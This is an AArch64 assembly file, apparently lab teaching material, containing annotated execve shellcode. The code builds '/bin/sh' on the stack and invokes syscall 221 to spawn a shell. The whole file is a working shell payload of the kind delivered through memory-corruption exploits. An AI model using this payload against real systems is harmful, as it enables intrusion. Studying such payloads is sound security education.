/* execve_arm64.S — assemble: aarch64-linux-gnu-gcc -nostdlib -static \
 *                           -o a64 execve_arm64.S   (run under qemu-aarch64)
 * Lab-only teaching payload. See ../../ETHICS.md. */
.global _start
.text
_start:
    movz  x0, #0x622f                /* ❶ build "/bin/sh\0" in x0, 16 bits at a time */
    movk  x0, #0x6e69, lsl #16       /*    "ni" */
    movk  x0, #0x732f, lsl #32       /*    "s/" */
    movk  x0, #0x0068, lsl #48       /*    "\0h" -> x0 = 0x0068732f6e69622f */
    str   x0, [sp, #-16]!            /* ❷ push the 8-byte string onto the stack */
    mov   x0, sp                     /* ❸ x0 -> "/bin/sh" (path) */
    mov   x1, xzr                    /* ❹ x1 = 0 -> argv = NULL */
    mov   x2, xzr                    /* ❺ x2 = 0 -> envp = NULL */
    mov   x8, #221                   /* ❻ x8 = __NR_execve */
    svc   #0                         /* ❼ supervisor call; never returns */
